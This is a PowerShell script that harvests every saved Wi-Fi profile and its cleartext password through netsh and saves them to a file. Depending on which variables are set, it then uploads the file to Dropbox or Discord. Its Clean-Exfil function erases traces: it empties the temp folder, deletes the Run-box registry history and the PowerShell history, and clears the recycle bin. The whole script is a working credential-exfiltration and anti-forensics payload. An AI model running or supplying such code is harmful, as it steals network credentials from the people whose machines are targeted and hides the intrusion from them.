Write-Host "Script started"

$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

Write-Host "Wi-Fi profiles gathered:"
Write-Host $wifiProfiles

$dir = Split-Path -Parent $MyInvocation.MyCommand.Definition
$wifiProfiles | Out-File -Encoding utf8 -FilePath "$dir\data.txt"

Write-Host "Wi-Fi profiles saved to file"

# Upload output file to Dropbox or Discord

if (-not ([string]::IsNullOrEmpty($db))){
    Write-Host "Uploading to Dropbox..."
    DropBox-Upload -f "$dir\data.txt"
    Write-Host "Upload to Dropbox completed"
}

if (-not ([string]::IsNullOrEmpty($dc))){
    Write-Host "Uploading to Discord..."
    Upload-Discord -file "$dir\data.txt"
    Write-Host "Upload to Discord completed"
}

function Clean-Exfil { 
# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

if (-not ([string]::IsNullOrEmpty($ce))) {
    Write-Host "Cleaning exfiltration traces..."
    Clean-Exfil
    Write-Host "Exfiltration traces removed"
}
